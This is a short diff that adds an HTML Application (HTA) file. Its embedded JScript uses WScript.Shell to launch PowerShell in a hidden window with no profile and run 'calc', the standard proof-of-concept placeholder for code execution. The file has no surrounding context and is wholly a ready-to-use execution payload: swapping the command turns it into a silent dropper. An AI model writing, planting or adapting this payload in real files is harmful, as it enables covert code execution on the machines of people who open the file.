@@ -1,0 +1,2 @@
+<HTA:APPLICATION ID="y"><script language="JScript">new ActiveXObject("WScript.Shell").Run("powershell -w hidden -nop -c calc",0);</script>
+
